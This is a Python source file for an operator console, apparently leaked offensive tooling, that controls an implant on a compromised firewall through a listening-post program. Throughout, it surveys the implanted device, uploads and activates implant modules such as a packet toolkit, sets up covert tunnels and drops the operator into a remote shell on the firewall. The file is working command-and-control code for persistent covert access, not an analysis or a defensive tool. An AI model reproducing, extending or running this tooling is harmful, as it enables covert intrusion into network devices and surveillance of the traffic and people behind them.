
import tunnel
import fw_logging
import tools
import cmd
import os
import random
import pexpect
import datetime
import ConfigParser
import logging
import sys
import shelve
import subprocess
import shlex

class BananaGlee(cmd.Cmd):
	
	def __init__(self, shelve_file, logger):
		'''Intalize variables'''
		cmd.Cmd.__init__(self)

                #shelve file
		self.sfile = shelve_file
		#self.sfile = shelve.open(self.shelve_file)

                #set up logging
		name = 'bananaglee' + self.sfile['version']
		self.logger = logger 
		self.prompt = 'BG' + self.sfile['version'] + '>>'

		#log shelve file
		self.logger.debug('sfile contents:')
		for i in self.sfile:
			self.logger.debug(i + ' : ' + str(self.sfile[i]))

		#Parse out tools config which is generated by finder
		self.tools_config = ConfigParser.ConfigParser()
		self.tools_config.read(os.path.join(self.sfile['script_dir'],'tools.cfg'))
		try:
			self.sfile['lp_bin'] = self.tools_config.get(str(self.sfile['tool']) + str(self.sfile['version']),'lp')
		except:
			self.logger.debug('could not get lp from banananaglee' + str(self.sfile['version']))
	
		self.sfile['timestamp'] = tools.timeStamp()
		self.sfile['lp_dir'], tmp = os.path.split(self.sfile['lp_bin'])
		self.sfile['logs_to_process'] = os.path.join(self.sfile['log_dir'], self.sfile['hostname'] + '.' + self.sfile['target'])
		self.sfile['logfile'] = os.path.join(self.sfile['log_dir'],'BG_log_' + str(self.sfile['hostname']) + '.' + str(self.sfile['target'])+ '.log')

		if not os.path.exists(self.sfile['logs_to_process']): # creates log dir
			os.makedirs(self.sfile['logs_to_process'])
		
		if self.sfile.has_key('lp') == True:
			self.logger.debug('lp ip already exists')
		else:
			self.sfile['lp'] = '127.0.0.1'

		if self.sfile.has_key('implant') == True:
			self.logger.debug('implant ip already exists')
		else:
			self.sfile['implant'] = '127.0.0.1'

		if self.sfile.has_key('idkey')  == True:
			self.logger.debug('idkey already exists')
			if os.path.isfile(self.sfile['idkey']) == False:
				self.logger.error('Your keyfile does not exist at: ' + str(self.sfile['idkey']))
		else:
			self.sfile['idkey'] = 'idkey'

		
		self.sfile['sport'] = tools.newPort()
		self.sfile['dport'] = tools.newPort()
		

		#set survey to false
		if tools.timeStamp().split('_')[0] == self.sfile['timestamp'].split('_')[0]:
			pass
		else:
			self.sfile['survey'] = False

		#log starting values
		self.logger.info('starting bananaglee ' + self.sfile['version'])
		self.logger.info('LP IP: ' + self.sfile['lp'])
		self.logger.info('Implant IP: ' + self.sfile['implant'])
		self.logger.info('IDKey : ' + self.sfile['idkey'])
		self.logger.debug('Source Port: ' + str(self.sfile['sport']))
		self.logger.debug('Destination Port: ' + str(self.sfile['dport']))

		os.chdir(self.sfile['lp_dir'])
		if self.sfile.has_key('uploaded_mod_list') == True:
			self.uploaded_mod_list = self.sfile['uploaded_mod_list']
		else:
			self.uploaded_mod_list = []


		if self.sfile.has_key('persistent_modules') == False:
			self.sfile['persistent_modules'] = []


		#auto
		if self.sfile['auto'] == True:
			if self.sfile['auto_start'] == True:
				self.do_survey(' ')
				if 'packetToolkit' in self.sfile['uploaded_mod_list']:
					self.logger.info('PTK is already here')
					self.sfile['auto_PTK'] = False
				else:
					self.logger.info('PTK not present, uploading')
					self.sfile['auto_PTK'] = True
					self.do_load('packetToolkit')
				self.sfile['tunnel'] = True
				print self.sfile['tunnel']
				print self.sfile['current_rule']
		                tunnel_mod = tunnel.Tunnel(self.sfile,self.logger)
		                tunnel_mod.cmdloop()
				self.do_quit(' ')
			elif self.sfile['auto_end'] == True:
				self.do_set_survey(' ')
				if 'packetToolkit' in self.sfile['persistent_modules']:
					self.logger.info('PTK is a persistent module')
				else:
					self.logger.info('unloading PTK')
					self.do_unload('packetToolkit')
					tools.resetAuto(self.sfile,self.logger)
					sys.exit()	
        
	#used to not run last command when nothing is given
        def emptyline(self):
                pass

	#shows the current settings for talking to bananaglee
	def do_show_settings(self, option):
		'''show_settings
		prints out the current settings'''
		tools.show_settings(self.sfile, option, self.logger)

	#way to set survey to true	
	def do_set_survey(self, option):
		self.logger.debug('user ran set_survey')
		self.sfile['survey'] = True
		self.logger.info('survey has been set to True')

	#runs survey config, interface, arp
	#add option to skip parts of the survey
	def do_survey(self, line):
		'''survey - preforms a survey, interface info/config/arp'''
		self.logger.debug('user ran survey')
		self.logger.info('running survey')

	
		#checks to make sure all parameters are defined	
		if tools.checks(self.sfile,self.logger) == False:
			print tools.show_settings(self.sfile,' ')
			self.logger.error('missing required parameters')
			return False
	
		tunnel_number = tools.openTunnel(self.sfile, self.logger)
	
		command = str(self.sfile['lp_bin']) + ' --lp ' + str(self.sfile['lp']) + ' --implant ' + str(self.sfile['implant']) + ' --idkey ' + str(self.sfile['idkey']) + ' --sport ' + str(self.sfile['sport']) + ' --dport ' + str(self.sfile['dport']) + ' --logdir ' + self.sfile['logs_to_process']
		self.logger.debug(str(command))
		
                temp_counter = 0
                found_file = False
                while found_file == False:
                        if os.path.isfile(os.path.join(self.sfile['log_dir'],self.sfile['hostname'] + '.' + self.sfile['target'] + '_BG_survey_' + str(temp_counter) + '_firewall.log')) == True:
                                temp_counter += 1
                        else:
                                logfile = os.path.join(self.sfile['log_dir'],self.sfile['hostname'] + '.' + self.sfile['target'] + '_BG_survey_' + str(temp_counter) + '_firewall.log')
                                found_file = True


		child = pexpect.spawn(command)
		plogfile = file(logfile, 'a')
		child.logfile = plogfile
		
                self.logger.info('parsing results, please wait')
                self.logger.info('You can check ' + str(logfile))

		#what need to be run for survey
		'''
		Add error handling:
		timeout issues
		talking to wrong version
		'''
		try:
			child.sendline('1')
			child.expect('BG#', timeout=120)
			child.sendline('10')
			child.expect('BG#', timeout=120)
			child.sendline('11')
			child.expect('BG#', timeout=120)
			child.sendline('12')
			child.expect('BG#', timeout=120)
			child.sendline('31')
			child.sendline('q')
			child.expect('BG#', timeout=120)
			child.sendline('9')
			child.expect('BG#', timeout=120)
			child.sendline('0')
		except:
			self.logger.exception('survey failed out')

		#read in results from survey and parse
		#should i index log file?
		
		with open(logfile,'r') as f:
			output = f.readlines()
		c = 0
		mod_start = 0
		uptime = 0
		mod_list = 0 
		for i in output:
			self.logger.debug(str(i.rstrip('\r\n')))
			if 'Connection Established to Implant' in i:
				implant_id = c
				self.logger.debug('found implant id at ' + str(c))
				self.logger.debug(str(i))
			elif 'OS Version' in i:
				os_version = c
				self.logger.debug('found the os version at ' + str(c))
				self.logger.debug(str(i))
			elif 'Implant Version' in i:
				implant_version = c
				self.logger.debug('found the implant version at ' + str(c))
				self.logger.debug(str(i))
			elif 'Uptime' in i:
				uptime = c
				self.logger.debug('found the uptime at ' + str(c))
				self.logger.debug(str(i))
			elif 'Printing the interface info and security levels' in i:
				int_start = c
				self.logger.debug('found the start of the interface info at ' + str(c))
				self.logger.debug(str(i))
			elif 'Module Name          Version' in i:
				mod_start = c
				self.logger.debug('found the start of module info at ' + str(c))
				self.logger.debug(str(i))
			elif '###################' in i:
				mod_list_start = c + 4
				self.logger.debug('found the start of the module list at ' + str(c+4))
				self.logger.debug(i)
			c += 1
		int_end_tmp = 0
		for i in output[int_start:int_start + 20]:
			if 'BG#' in i:
				int_end = int_end_tmp + int_start
				self.logger.debug('found the end of the interface information at ' + str(int_end))
				self.logger.debug(str(i))
			else:
				int_end_tmp += 1

		if mod_start != 0:
			mod_end_tmp = 0
			for i in output[mod_start:mod_start + 20]:
				if 'BG#' in i:
					mod_end = mod_end_tmp + mod_start
					self.logger.debug('found the end of the loaded modules at ' + str(mod_end))
					self.logger.debug(str(i))
				else:
					mod_end_tmp += 1

		if mod_list_start != 0:
			mod_list_end_temp = 0
			for i in output[mod_list_start:mod_list_start + 20]:
				if '# Select' in i:
					mod_list_end = mod_list_end_temp + mod_list_start
					self.logger.debug('found the end of the module list at ' + str(mod_list_end))
					self.logger.debug(str(i))	
				else:
					mod_list_end_temp += 1
		module_list = output[mod_list_start:mod_list_end]

		#store list of avliable modules
		#self.params_dict['modules'] = output[mod_list_start:mod_list_end+1]

		uploaded_modlist_tmp = []

		#print out parsed results
		self.logger.info('Survey Information')
		try:	
	                self.logger.info('        Implant ID: ' + str(output[implant_id].split(' ')[4]).rstrip('\r\n'))
		except:
			self.logger.exception('could not determine the implant id')        

		try:
		        self.logger.info(output[os_version].rstrip('\r\n'))
		except:
			self.logger.exception('could not determine the OS')

		try:
	                self.logger.info(output[implant_version].rstrip('\r\n'))
		except:
			self.logger.exception('could not determine the implant version')

		try:
			if uptime != 0:
				self.logger.info(output[uptime].rstrip('\r\n'))
		except:
			self.logger.exception('could not determine the uptime')
	
		try:
			if mod_start != 0:
				module_info = output[mod_start:mod_end]
				end = False
				for i in module_info[:-1]:
					for j in i.split(' '):
						if j in self.sfile['mod_num_dict']:
							uploaded_modlist_tmp.append(j) 
					if 'BG#' in i:
						end = True
					if end == False:
						self.logger.info(i.rstrip('\r\n'))
			else:
				self.logger.info('No modules are currently uploaded')
		except:
			self.logger.exception('could not get the module information')

		try:
			interface_info =  output[int_start:int_end + 1]
			interface_info_out = []
			for i in interface_info:
				self.logger.info(i.rstrip('\r\n'))
		except:
			self.logger.exception('could not get the interface information')

		try:
			#store in dictomary the modules with the number
			mod_num_dict = {}
			self.logger.info('List of modules that can be uploaded')
			for i in module_list:
				format = i.rstrip('\r\n')[1:]
				mod_array = filter(None, format.split(' '))
				if len(mod_array) == 3:
					self.logger.info(mod_array[1])
					number = mod_array[0]
					mod_num_dict[mod_array[1]] = number[:-1]
	
			self.logger.debug(mod_num_dict)
			self.sfile['mod_num_dict'] = mod_num_dict
	                #set up dicts to store handle information
        	        for i in mod_num_dict:
                	        if self.sfile.has_key(i) == False:
                        	        self.sfile[i] = {}
		except:
			self.logger.exception('could not build module dictonary')

		#get uploaded modules
		self.sfile['uploaded_mod_list'] = uploaded_modlist_tmp
		
		plogfile.close()
		#set survey to true
		self.sfile['survey'] = True

                tools.closeTunnel(self.sfile,tunnel_number,self.logger)
	
	def do_show_uploadable_modules(self, option):
		'''show_uploadable_modules
		displays the modules that can be uploaded'''
		
		self.logger.debug('user ran show_uploadable_modules')
		self.logger.info('List of modules that can be uploaded')
		try:
			for i in self.sfile['mod_num_dict']:
				self.logger.info(i)
		except:
			self.logger.exception('could not read mod_num_dict from shelve')
	
	def do_tunnel(self, option):
		'''tunnel [OPTION]
		calls program to manage tunnels
		option: simple advanced'''
		self.logger.debug('user ran tunnel')

		if self.sfile['survey'] == False:
			self.logger.error('survey had not been completed, please run survey')
			return
		
		if 'packetToolkit' in self.sfile['uploaded_mod_list']:
			pass
		else:
			self.logger.error('your tunnel module is not uploaded')
			return

		self.logger.info('Starting tunnel in ' + str(option) + ' mode')
		if option == '':
			option = 'simple'
		elif option == 'simple':
			option = 'simple'
		else:
			option = 'advanced'
		
		self.sfile['mode'] = option	

		tunnel_mod = tunnel.Tunnel(self.sfile,self.logger)
		tunnel_mod.cmdloop()
	
	def complete_unload(self, text, line, begidx, endidx):
		return [i for i in self.sfile['uploaded_mod_list'] if i.startswith(text)]

	def do_unload(self, module):
		'''unload [module]
		deactivates and removes a module'''
		self.logger.debug('user ran unload ' + str(module))


                if self.sfile['survey'] == False:
                        self.logger.error('survey had not been completed, please run survey')
			return

		if module in self.sfile['uploaded_mod_list']:
			pass
		else:
			self.logger.error('module: ' + str(module) + ' is not an uploaded module') 	
			self.logger.info('Current uploaded modules are: ')
			if len(self.sfile['uploaded_mod_list']) == 0:
				self.logger.info('I do not know of any uploaded modules')
			else:
				for i in self.sfile['uploaded_mod_list']:
					self.logger.info(i)
			return


		command_id = self.tools_config.get('bananaglee' + str(self.sfile['version']), module + '_ID')
		self.logger.debug('command id: ' + str(command_id))

		self.logger.info('unloading the ' + str(module) + ' module')
		
                tunnel_number = tools.openTunnel(self.sfile, self.logger)


		command = str(self.sfile['lp_bin']) + ' --lp ' + str(self.sfile['lp']) + ' --implant ' + str(self.sfile['implant']) + ' --idkey ' + str(self.sfile['idkey']) + ' --sport ' + str(self.sfile['sport']) + ' --dport ' + str(self.sfile['dport']) + ' --logdir ' + str(self.sfile['logs_to_process'])
		self.logger.debug(command)
                temp_counter = 0
                found_file = False
                #create log file and set up loagging
                while found_file == False:
                        if os.path.isfile(os.path.join(self.sfile['log_dir'],self.sfile['hostname'] + '.' + self.sfile['target'] + 'BG_shell' + str(temp_counter) + '.log')) == True:
                                temp_counter += 1
                        else:
                                log_file = os.path.join(self.sfile['log_dir'],self.sfile['hostname'] + '.' + self.sfile['target'] + 'BG_shell' + str(temp_counter) + '.log')
                                found_file = True
		self.logger.debug('log file: ' + log_file)
		child = pexpect.spawn(command)
                logfile = file(log_file,'a')
                child.logfile = logfile

		''' ADD ERROR CHECKING '''
		try:
	                child.sendline('1')
			child.expect('BG#', timeout=120)
                	child.sendline('33 ' + str(command_id) + ' 34 ' + str(command_id))
			child.expect('BG#', timeout=180)
			child.sendline('36')	
			child.expect('BG#', timeout=120)
	                child.sendline('9')
        	        child.expect('BG#', timeout=120)
                	child.sendline('0')
		except:
			self.logger.exception('unload ' + str(module) + ' failed')

		#add parsing
                tools.closeTunnel(self.sfile,tunnel_number,self.logger)

                logfile.close()

		#remove module from uploaded mod list	
		n = 0
		tmp_list = self.sfile['uploaded_mod_list']
		for i in tmp_list:
			if i == module:
				tmp_list.pop(n)
			else:
				n += 1
		self.sfile['uploaded_mod_list'] = tmp_list
	

	def do_show_uploaded_modules(self, line):
		'''show_uploaded_modules [connect]
		returns the modules that are currently uploaded
		if connect is used a connection to the firewall will be made'''
		if line == '':
			self.logger.info('modules that are currently loaded')
			for mod in self.sfile['uploaded_mod_list']:
				self.logger.info(str(mod))
		elif line[0].lower() == 'c':
			tunnel_number = tools.openTunnel(self.sfile, self.logger)
			command = str(self.sfile['lp_bin']) + ' --lp ' + str(self.sfile['lp']) + ' --implant ' + str(self.sfile['implant']) + ' --idkey ' + str(self.sfile['idkey']) + ' --sport ' + str(self.sfile['sport']) + ' --dport ' + str(self.sfile['dport']) + ' --logdir ' + self.sfile['logs_to_process']
			child = pexpect.spawn(command)
	                temp_counter = 0
        	        found_file = False

	                while found_file == False:
        	                if os.path.isfile(os.path.join(self.sfile['log_dir'],self.sfile['hostname'] + '.' + self.sfile['target'] + 'BG_shell' + str(temp_counter) + '.log')) == True:
                	                temp_counter += 1
                        	else:
                                	log_file = os.path.join(self.sfile['log_dir'],self.sfile['hostname'] + '.' + self.sfile['target'] + 'BG_shell' + str(temp_counter) + '.log')
	                                found_file = True

			logfile = file(log_file,'a')
	                child.logfile = logfile

			try:
				child.sendline('1')
		                child.expect('BG#', timeout=120)
				child.sendline('36')
				child.expect('BG#', timeout=180)
				child.sendline('9')
				child.expect('BG#', timeout=120)
        	                child.sendline('0')
			except:
				self.logger.exception('Could not list out uploaded modules')

			self.logger.info('uploaded modules')
			for i in child.before.split('\r\n'):
				self.logger.info(i)
			tools.closeTunnel(self.sfile,tunnel_number,self.logger)
	def do_shell(self, module):
		'''shell
		drops user to a BANANAGLEE shell'''
		self.logger.debug('user ran shell')

                tunnel_number = tools.openTunnel(self.sfile, self.logger)

                command = str(self.sfile['lp_bin']) + ' --lp ' + str(self.sfile['lp']) + ' --implant ' + str(self.sfile['implant']) + ' --idkey ' + str(self.sfile['idkey']) + ' --sport ' + str(self.sfile['sport']) + ' --dport ' + str(self.sfile['dport']) + ' --logdir ' + self.sfile['logs_to_process']

                child = pexpect.spawn(command)
                temp_counter = 0
                found_file = False
                #create log file and set up loagging
                while found_file == False:
                        if os.path.isfile(os.path.join(self.sfile['log_dir'],self.sfile['hostname'] + '.' + self.sfile['target'] + 'BG_shell' + str(temp_counter) + '.log')) == True:
                                temp_counter += 1
                        else:
                                log_file = os.path.join(self.sfile['log_dir'],self.sfile['hostname'] + '.' + self.sfile['target'] + 'BG_shell' + str(temp_counter) + '.log')
                                found_file = True
                logfile = file(log_file,'a')
                child.logfile = logfile


		try:
			child.interact()
		except:
			self.logger.debug('user left shell')

                tools.closeTunnel(self.sfile,tunnel_number,self.logger)

                logfile.close()

		return

        def complete_load(self, text, line, begidx, endidx):
                return [i for i in self.sfile['mod_num_dict'] if i.startswith(text)]


	def do_load(self, module):
		'''load [module]
		uploads and activates a module'''
		self.logger.debug('user ran load ' + str(module))

	
		#check to make sure it is a valid module and get the number for that module		
		if module in self.sfile['mod_num_dict']:
			module_number = self.sfile['mod_num_dict'][module]
		else:
			self.logger.error('selected an invalid module, the valid modules are:')
			self.do_show_uploadable_modules(' ')

		#check to make sure that module is not already uploaded
		if module in self.sfile['uploaded_mod_list']:
			self.logger.info('the module ' + str(module) + ' is already uploaded')
			return
	
		#check to see if user ran survey
		if self.sfile['survey'] == False:
                        self.logger.error('survey had not been completed, please run survey')
			return

		#build command to run and spawn pexpect

                tunnel_number = tools.openTunnel(self.sfile, self.logger)
                command = str(self.sfile['lp_bin']) + ' --lp ' + str(self.sfile['lp']) + ' --implant ' + str(self.sfile['implant']) + ' --idkey ' + str(self.sfile['idkey']) + ' --sport ' + str(self.sfile['sport']) + ' --dport ' + str(self.sfile['dport']) + ' --logdir ' + self.sfile['logs_to_process']

		child = pexpect.spawn(command)
		temp_counter = 0
		found_file = False
	
		#create log file and set up loagging
		while found_file == False:
			if os.path.isfile(os.path.join(self.sfile['log_dir'],self.sfile['hostname'] + '.' + self.sfile['target'] + 'BG_upload_module' + str(temp_counter) + '.log')) == True:
				temp_counter += 1
			else:
				log_file = os.path.join(self.sfile['log_dir'],self.sfile['hostname'] + '.' + self.sfile['target'] + 'BG_upload_module' + str(temp_counter) + '.log')
				found_file = True
		logfile = file(log_file,'a')
                child.logfile = logfile

		try:
			#open session with the firewall
        	        child.sendline('1')

			#upload the selected module	
			child.expect('BG#', timeout=120)
        	        child.sendline('31')
                	child.expect('# Select module', timeout=120)
	                child.sendline(str(module_number))
			self.logger.debug('uploading ' + str(module) + ' with ID of: ' + str(module_number))
			child.expect('BG#', timeout=300)	

			#check id number from config and activate module
                	id_num = self.tools_config.get('bananaglee' + self.sfile['version'], str(module) + '_ID')
			child.sendline('32 ' + str(id_num))
			self.logger.debug('activating the module with 32 ' + str(id_num))

			#check to make sure module is uploaded
        	        child.expect('BG#', timeout=120)
                	child.sendline('36')
	                child.expect('BG#', timeout=120)

			#close session with the firewall
                	child.sendline('9')
	                child.expect('BG#', timeout=120)
        	        child.sendline('0')

			#close logfile
                	logfile.close()
		except:
			self.logger.exception('could not load the module : ' + str(module))

                tools.closeTunnel(self.sfile,tunnel_number,self.logger)

		#read in log file
        	with open(log_file,'r') as f:
			output = f.readlines()

		#build dict in be inserted in the mod_dict with the command handles returned
	 	insert_dict = {}
		for i in output:
			if 'Command' in i:
				self.logger.info(i.rstrip('\r\n'))
				command_id = i[-6:].rstrip('\r\n')
				command = i.split("'")[1]
				insert_dict[command] = str(command_id)
		
		#insert dict
		self.sfile[module] = insert_dict
		self.uploaded_mod_list.append(module)		
		self.sfile['uploaded_mod_list'] = self.uploaded_mod_list

        def do_lp(self, lp):
                '''lp [IP of lp]
                sets lp to use, defaults to 127.0.0.1 '''
		if tools.checkIP(lp) == True:		
			self.sfile['lp'] = lp
			self.logger.debug('LP IP has been changed to: ' + str(lp))
		else:
			self.logger.error('the IP that you entered is not valid')

        def do_implant(self, implant):
                '''implant [IP of implant]
                sets lp to use, defaults to 127.0.0.1 '''
		if tools.checkIP(implant) == True:
	                self.sfile['implant'] = implant
			self.logger.debug('implant IP has been changed to: ' + str(implant))
                else:
                        self.logger.error('the IP that you entered is not valid')

	def do_idkey(self, idkey):
		'''idkey [full path to key]
		sets the key to use'''
		if os.path.isfile(idkey) == True:
			self.sfile['idkey'] = idkey
			self.logger.debug('the IDKEY has been changed to: ' + str(idkey))
		else:
			self.logger.error('the IDKEY that you provided does not exist')

	def do_exit(self, line):
                '''exit - exits the program'''
                #reset auto settings
                self.sfile['auto_PTK'] = False

                if self.sfile['uploaded_mod_list'] == []:
                        self.logger.debug('all uploaded modules have been removed')
                else:
                        self.logger.info('not all modules that you have uploaded have been removed: ')
                        for module in self.sfile['uploaded_mod_list']:
                                self.logger.info(str(module))
                self.logger.info('shutting down tunnel window')
                tools.shutdownTunnel(self.sfile,self.logger)
                self.logger.debug('exiting')
                self.logger.debug(self.sfile)
		sys.exit()

	def do_quit(self, line):
		'''quit - quits the current context'''
		#reset auto settings
		self.sfile['auto_PTK'] = False
			
		if self.sfile['uploaded_mod_list'] == []:
			self.logger.debug('all uploaded modules have been removed')
		else:
			self.logger.info('not all modules that you have uploaded have been removed: ')
			for module in self.sfile['uploaded_mod_list']:
				self.logger.info(str(module))
		self.logger.info('shutting down tunnel window')
		tools.shutdownTunnel(self.sfile,self.logger)
		self.logger.debug('exiting')
		self.logger.debug(self.sfile)
		return True
